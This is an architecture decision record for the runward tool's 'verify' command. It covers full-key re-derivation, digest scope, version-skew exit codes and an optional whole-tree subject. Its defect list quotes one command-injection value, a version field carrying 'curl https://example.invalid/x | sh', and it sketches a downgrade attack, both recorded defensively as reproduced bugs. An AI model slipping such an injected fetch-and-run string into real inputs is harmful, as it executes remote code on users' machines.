# ADR-0113 — `verify` says verified only for what it re-derives, names what it covers, and sends an attestation back to the runward that produced it

**Date**: 2026-11-05
**Status**: accepted (2026-11-05)
**Deciders**: a delegated agent, acting under class D of `runward/delegation.md` (non-constitutional
ADRs), on the maintainer's instruction of 2026-11-05 to bring runward to the level an enterprise
requires. Under ADR-0088 decision 4 the maintainer is the single accountable person; this record is
disclosed throughput, not independent review. It refines accepted decisions (listed under
Consequences); whether refining them stays inside class D, or is the "superseding an accepted
decision" that ADR-0088 decision 2 puts in class R, is the maintainer's to confirm before merge
**Method**: read on a fresh clone of `stranxik/runward` at `main@61d5041` (0.46.0 plus the unreleased
entries): `src/commands/verify.ts`, `src/lib/attestation.ts`, `src/lib/check-contract.ts`
(`machinePayload`, `nextStep`), `src/commands/check.ts` (the `--attest` branch), `src/commands/bundle.ts`,
`verify/action.yml`, the tests that pin `verify` (`verify-*.test.js`, `check-json-next`,
`check-machine-surface`, `check-json-by-row`), ADR-0012, ADR-0054, ADR-0055, ADR-0083, ADR-0095,
ADR-0109, RWD-2026-0192 and RWD-2026-0193. Each defect below was reproduced on that build and on
`init --example` before anything was changed, with a positive control, under Node.js 24.22.1; each
is now a case of the tests named under References, failing on that build. The attestations of one
tree under Node.js 22.22.2, 24.18.0 and 24.22.1 were read byte-identical (the investigation of
2026-11-05)
**Relates to**: [ADR-0055](ADR-0055-the-verdict-is-a-standards-legible-attestation.md) layer 2 (the
re-check this refines), [ADR-0054](ADR-0054-the-runtime-boundary-is-explicit.md) (what the tree subject
may read), [ADR-0083](ADR-0083-exit-code-two-carries-several-meanings-say-which-before-splitting-it.md)
(the classes of exit 2), [ADR-0095](ADR-0095-check-json-carries-ratification-row-by-row-causes-by-kind-and-the-assurance-mode-in-force.md)
and [ADR-0109](ADR-0109-the-mission-is-named-by-what-it-declares-never-by-its-checkout-folder.md)
(their `verify` rules), RWD-2026-0192 and RWD-2026-0193 in [known-defects.md](../compliance/known-defects.md)

## Context

**What `verify` promised.** README: "a drifted tree or a tampered predicate fails, loud", "a version
skew is named, so verdict-logic evolution is never mistaken for forgery". ADR-0055 layer 2: the
attestation is "self-checking by anyone, months later, on the repo alone".

**What it did, measured on 2026-11-05.**

1. **It blessed what it did not compare.** The comparison was a list of known fields, a second list
   named some others "not re-derived offline", and the result line said "✓ verified" over both.
   `currentGate: "independently audited"`, `adrCount: 42` and `next.command: "git push --force"` on an
   untouched tree: "✓ verified — the attestation binds to this tree, and its verdict re-derives on the
   repo alone", exit 0. `prosePointers` emptied on a tree that has one: exit 0, and the field was in
   neither list. A key `verify` did not know, or a strict-only field added to a presence attestation,
   passed the same way (RWD-2026-0192). Five of the fields it called "not re-derived offline"
   (`mission`, `currentGate`, `adrCount`, `corpusPin`, `corpusDrift`) are computed from the tree by
   `check`, offline.
2. **It said more than its digest binds.** "subject digest matches — this attestation is about this
   exact tree", while the digest covers `runward/` and the evidence the manifests cite, as ADR-0055's
   amendment of 2026-08-14 says. A file added under `code/src/` that runs its input with `execSync`,
   and an uncited `code/README.md` edited, left `verify` at exit 0 with that line; one line appended to
   the cited `code/src/core/domain/guard.ts` gave "subject digest DIFFERS", exit 1 (RWD-2026-0193).
3. **It refused an honest older attestation as it refuses a forgery.** An attestation produced by
   0.37.1 on its own tree, verified by 0.37.1: exit 0; by 0.46.0: "✗ NOT verified — do not trust this
   attestation for this tree", exit 1, the exit of a tampered predicate, `gateNonScope` named as the
   difference (its text changed between the two versions). The skew line was advisory and "never moves
   the exit code", so the only signal a CI reads said forgery.
4. **Two more, found while reproducing.** The command printed under a skew was built from the
   attestation's own `runward` field, unchecked: `"0.1.0; curl https://example.invalid/x | sh #"`
   printed `npx runward@0.1.0; curl https://example.invalid/x | sh # verify b.json` as the gesture to
   run. And the attestation of a red tree differed by how the command was typed: `next.command`,
   `next.rerun` and `next.text` echo `-p <path>` (`runward check -p . --strict` against `runward check
   --strict`), so two attestations of one tree differed, and `verify` could not re-derive those three
   fields without the invocation.

**Why the list approach kept failing.** RWD-2026-0042 (two fields compared), RWD-2026-0095 (three
tables uncompared) and RWD-2026-0192 are one defect three times: each new field had to be added to
`verify` by hand, and a field nobody added was blessed. The tolerance for older producers made it
worse: "an attestation sealed before the field existed keeps verifying" was implemented as "a missing
field is skipped", and a missing field is also what a removal looks like. The only evidence the code
had that an attestation was older was the absence itself.

**What a newer binary can know about an older attestation.** Nothing certain: the verdict is the
output of a versioned function (64 tagged releases between 2026-07-06 and 2026-10-28; the same tree
exits 0 under 0.31.0 and 1 under 0.44.0, ROADMAP, measured 2026-10-18), and comparing version Y's
reading of a tree with version X's record cannot tell logic change from tampering, in either
direction. runward already answers the same gap for its hooks by pinning, not by making versions
agree: every hook it writes runs the version that wrote it (TOR-243). The producing version can be
fetched: npm never lets a published version be replaced, and runward's releases carry provenance
(docs/verifying-a-release.md).

**The tree.** An adopter who wants "change any file and `verify` refuses" has no way to ask for it.
Binding every file by default would break the attestation at the first README edit: a cost that is the
point for a delivery whose every file is under review, and a nuisance for one that only wants the
verdict carried.

## Decision

**1. `verify` re-derives the whole Statement, under the build that produced it, and compares every
key both ways.** It rebuilds, with the functions `check` emits with (`computeVerdict`,
`machinePayload`, `buildVerdictStatement`), the Statement this binary emits for this tree and for the
question the attestation records: `strict`, `through`, and whether the run used `--hooks` or
`--coverage` (the presence of their blocks). It compares the attestation to it key by key, in both
directions: a key the attestation carries and this build does not emit is a difference, and so is a key
this build emits and the attestation lacks. Key order is not meaning; array order is. The envelope is
compared too (`_type`, `predicateType`, the subject's name, no other top-level key). Every field
`check` computes offline is re-derived: `runward`, `mission`, `currentGate`, `adrCount`, `adrSetAside`,
`corpusPin`, `corpusDrift`, `prosePointers`, `gaps.hooks` (0 when no hook ran), `hooks.config` and
`hooks.problem`, all of `next`. One input is not re-derivable offline: which of the operator's hook
commands failed, when `--hooks` ran at least one (decision 2, `not-re-derivable`). The `-p` echo leaves the attestation:
its `next` is computed for the bare command (`runward check --strict`), so it re-derives and two
attestations of one tree are byte-identical however the command was typed; `check --json` keeps the
echo, which is right for a reader at the terminal that typed it.

**2. Four answers, three exit codes.**

| `result` | Exit | When | `error` (ADR-0083) |
|---|---|---|---|
| `verified` | 0 | same build, the digest and every key agree (a red verdict that agrees is still `verified`: "authentic, not passing", TOR-067) | none |
| `differs` | 1 | same build, and the digest, a key, or the delivered tree differs | none |
| `version-skew` | 2 | another build produced it | `version-skew` |
| `not-re-derivable` | 2 | same build, everything else agrees, and the attesting run executed hook commands | `not-re-derivable` |

Exit 2 keeps its meaning, "the question could not be asked" (ADR-0012, ADR-0083): this binary cannot
answer for this attestation. It is distinct from 1 by construction, so a consumer that branches on
`== 1` never reads a skew as tampering, and one that branches on `!= 0` still fails closed. A
difference found under the producing build outranks everything: `differs` is never hidden behind a 2.

**3. The perimeter is said exactly.** The digest line reads "subject digest matches — it binds
runward/ (M files) and the N evidence files the manifests cite outside it", followed by "not covered:
every other file of the project", and `--json` carries `digest.covers` (`missionFiles`,
`citedOutside`, the list) and `digest.notCovered`. The result line repeats the scope. `bundle`'s result
names its artifacts and says a file it does not list is not covered. The VSA prints no such sentence and
is not read by `verify`: unchanged.

**4. The attestation names its producer, and only its producer re-derives it.** `check --attest`
adds `predicate.producer`: `{ name, version, purl, build }`, where `purl` is `pkg:npm/<name>@<version>`
(what retrieves it) and `build` is `sha256:` of the files the verdict is computed by, `dist/` and
`templates/` of the running package, path and line-ending-normalised content (what confirms that the
retrieved binary is the one). A published version gives one build on every machine; a build from a
working copy that still says 0.46.0 gives another, which is how a development build stops being taken
for the release it is numbered after. Under another producer (another version, another build, or no
build recorded, which is every attestation made before this record), `verify` answers
`version-skew`: it names the producer, prints `npx --yes runward@X verify <file> [-p <path>]` (the
version printed only when it reads as a version, `-p` echoed from the verifier's own invocation), and
gives its own reading as advisory: the digest, the verdict, and the keys the attestation carries that
read differently under this build. An attestation that names no producer at all is not an older one
(every runward since 0.35.0, the first with `--attest`, writes `runward`): it is compared under this
build and differs.

**Can a newer binary re-derive an older attestation? No.** It reads it and says what it reads,
labelled advisory; it never answers verified or not verified for it. Three reasons. A verdict is a
versioned function's output, and a newer function disagreeing with an older record says nothing about
the record. Leniency across versions, the only way to keep verifying older shapes, was the hole: a
comparison that skips what an older producer did not emit also skips what a forger deleted, and telling
them apart needs either a signature or a registry of every version's schema, neither of which a
verifier that holds no key and reads no network has. And the older binary stays retrievable, by the
command printed, which is what makes sending the reader there a gesture rather than a refusal.

**5. The delivered tree, a second subject, on request.** `check --attest --whole-tree` adds a second
subject, `<mission name> (delivered tree)`, and `predicate.deliveredTree = { files, rule, entries }`:
each delivered file's project-relative path and the SHA-256 of its line-ending-normalised content,
the subject's digest being the digest of that map, built like the mission-state digest. A delivered
file is every regular file and symbolic link under the project root that the project's own
`.gitignore` files do not ignore, read with git's pattern rules and without git, except `.git`
entries, nested repositories (a directory holding a `.git`), files of zero bytes, and runward
in-toto Statements (verdict or bundle, bare or in a DSSE envelope). A symbolic link is hashed by its
target, as git stores it. `verify` reports it on its own line: "the whole delivered tree matches (N
files)", or "differs: C changed, A added, R removed" with the paths; a difference is `differs`, exit 1,
with the verdict's own reading printed beside it. Without the flag nothing changes: the attestation has
one subject, and `verify` names what is not covered. The gate never reads the delivered tree: `check`'s
verdict, exit code and every other output are the same with and without the flag.

Why each exclusion: `.git` and nested repositories are another repository's state (ADR-0054 crossing
4); a runward Statement is about the tree, not part of it, and a signature or a bundle made after the
attestation would otherwise change it; and the shell creates the attestation's own file, empty, before
runward runs (`check --attest --whole-tree > verdict.intoto.json`), so an empty file cannot be bound
without binding that one.

**Not an ADR-0054 crossing.** It reads the working tree of the one project the mission judges and
nothing else: no process is spawned (no `git ls-files`), nothing under `.git` is read, no home
directory (no global excludes file), no file above the project root. It is a pure function of the
working tree, which is the property crossing 4 protects, and it is outside the verdict path.

## Alternatives discarded

- **Keep the field list, add the fields that were missing.** The fourth time would be the next field
  someone adds to `machinePayload` and not to `verify`. Comparing against the payload `check` builds
  makes forgetting impossible to ship: an honest attestation stops verifying the day a field is added
  on one side only, and the tests say so.
- **Name what is not re-derived, and keep "✓ verified".** What 0.46.0 did. The list was printed one
  line above the tick, and the tick is what a reader acts on.
- **Keep verifying older shapes (skip absent fields, accept older rows).** It could not tell an older
  producer from a stripper (decision 4). A registry of each version's emitted keys would tell them
  apart, at the price of a table rewritten at every release, and the producer claim would still be
  forgeable without a signature.
- **A newer binary answers verified when its own reading agrees, and 2 otherwise.** The downgrade
  attack: name an older producer, delete a disclosure the older version did not emit, and the lenient
  comparison blesses the deletion with exit 0.
- **Exit 3 for a skew.** Outside the 0/1/2 port every adapter reads (ADR-0012); ADR-0083 discarded
  distinct codes for the reasons that still hold, and the class is legible through `error`.
- **Exit 0 with an advisory for an attestation whose hooks ran.** A forged hook outcome would read 0.
  The hooks ran at the attesting run; re-running them is `runward check --strict --hooks`, which the
  output names.
- **Record the Node.js version in the producer.** The attestations of one tree are byte-identical
  under 22.22.2, 24.18.0 and 24.22.1; recording it would make them differ across machines (ADR-0109)
  for nothing the verdict depends on.
- **The tree from git (`git ls-files`).** A spawned process on the command that owns the exit code,
  which ADR-0054 crossing 1 and its ring test refuse.
- **The tree from `.git/index`, read without spawning.** That is git's state, not the working tree:
  two checkouts with the same files and different index states would bind differently, and a tree
  delivered without `.git` (an archive) could not be bound at all.
- **Every file under the root, no ignore rules.** A developer's tree (dependencies, build output) and
  a fresh clone of the same commit would never match.
- **A runward-specific ignore file.** A second place beside `.gitignore`, which already says what the
  project does not deliver (CONTRIBUTING, "Before you add a place for something").
- **The tree subject by default.** The objection measured before this record: the attestation would
  stop verifying at the first README edit. On request, it is that and says so; by default it would make
  `verify` a gate on documentation edits nobody asked it to watch.
- **The tree as an input to the gate.** The gate judges the traced decisions (ADR-0001); a README edit
  turning it red would change what it is.

## Consequences

- **Every attestation made before this record answers 2, with the command that re-derives it.** A CI
  that verifies committed attestations with `version: latest` moves from 0 (or 1) to 2 at the upgrade.
  Negative, accepted: the honest answer, and the fix is one input (`version:` in `verify/action.yml`)
  or the printed command.
- **An attestation's bytes change**: `producer` is added, `next` loses the `-p` echo, and under
  `--whole-tree` a second subject and `deliveredTree` appear. Additive for every reader of
  ADR-0030's keys; `check --json` is unchanged.
- **This refines, by name**: ADR-0055 layer 2 and its 2026-08-14 amendment (the skew no longer stays
  advisory: it is exit 2); ADR-0095's "Stripping all three passes" and its "`verify` on a 0.43.1
  attestation still exits 0" (now 2); RWD-2026-0149's tolerance of rows without the additive keys;
  ADR-0109 point 4 ("an older attestation verifies as before": it is now sent to its producer); and
  RWD-2026-0145's `next` echo, which no longer reaches the attestation. Notes are appended to ADR-0055,
  ADR-0083, ADR-0095 and ADR-0109; their decisions are not rewritten.
- **ADR-0083's trigger fires** ("a new command adds a fifth class of 2"): two classes, `version-skew` and
  `not-re-derivable`. Re-evaluated here: option A holds, the classes are legible by `error`, the port
  contract and `docs/interop.md` list them.
- **ADR-0055's trigger fires** ("the subject digest definition proves to bind less than a consumer
  assumed", RWD-2026-0193): answered by naming the perimeter and by the subject that binds the rest on
  request; the mission-state digest is unchanged.
- **Cost.** `check --attest` and `verify` hash the package's own `dist/` and `templates/` once (about
  170 files); `--whole-tree` reads every delivered file. The mutation records of `attestation.js`,
  `check-contract.js` and `paths.js` are stale until re-measured; `delivered-tree.js` is a candidate.
- **Pre-merge**: `src/commands/check.ts` (the attestation's `next`, the flag) is on the charter's
  pre-merge list, and the README's claims change.

### What this does not catch

- **The producer claim is a field of an unsigned document.** A forger can name an older producer and
  send the reader to that version's `verify`, with that version's limits (RWD-2026-0192 for 0.35.0 to
  0.46.0). This binary still answers 2, never 0, and its advisory names the keys that read differently.
  A signature under the operator's key binds the claim; runward checks none (ADR-0093).
- **An unpublished build cannot be fetched** by the command printed. Its `build` says that the
  published version is a different binary.
- **Hook outcomes** are the attesting run's record.
- **The delivered tree, as runward reads it, is not `git ls-files`.** A file ignored only by the global
  excludes file or `.git/info/exclude` counts as delivered; a file force-added inside an ignored
  directory does not; a `.gitignore` above the project root is not read; patterns match
  case-sensitively on every operating system; empty files and runward Statements are not bound. Each is
  declared in `deliveredTree.rule` and in `docs/interop.md`.

## What would settle it

- **For**: over the next ten releases, no honest attestation verified by its producing build answers 1;
  every forgery the tests carry answers 1 or 2 and none 0; on the fixture layouts and on runward's own
  repository, the delivered tree equals `git ls-files --cached --others --exclude-standard` run with no
  global excludes.
- **Against**: an assessor who cannot fetch the producing version and needs a newer binary to answer
  for an older attestation; a common layout where the delivered tree and git disagree; or an adopter
  for whom `--whole-tree` breaks on a file nobody considers delivered, more than once.

## Reevaluation trigger (mandatory, dated)

Reopen at the first honest attestation answered 1 by the build that produced it, at the first reported
disagreement between the delivered tree and `git ls-files` on a common layout, when the in-toto
attestation framework standardises a directory digest runward can emit in hex, or on 2027-02-05,
whichever comes first.

**Trigger set on**: 2026-11-05 · **Watched via**: `test/unit/verify-claims-only-what-it-checks.test.js`
and `test/unit/delivered-tree.test.js` (the git conformance cases), the defect register (`found-by`
any) for `verify`, and issues mentioning an exit 2 of `verify`.

## References

- `src/commands/verify.ts`, `src/lib/attestation.ts` (`producerIdentity`, `missionStateScope`,
  `buildVerdictStatement`), `src/lib/delivered-tree.ts`, `src/lib/check-contract.ts`
  (`attestedQuestion`), `src/commands/check.ts` (the `--attest` branch), `src/commands/bundle.ts`,
  `verify/action.yml`.
- `test/unit/verify-claims-only-what-it-checks.test.js`, `test/unit/delivered-tree.test.js`,
  `test/unit/verify-version-skew.test.js`.
- ADR-0012, ADR-0054, ADR-0055, ADR-0083, ADR-0088 decision 2, ADR-0093, ADR-0095, ADR-0109;
  RWD-2026-0042, RWD-2026-0095, RWD-2026-0145, RWD-2026-0149, RWD-2026-0192, RWD-2026-0193.
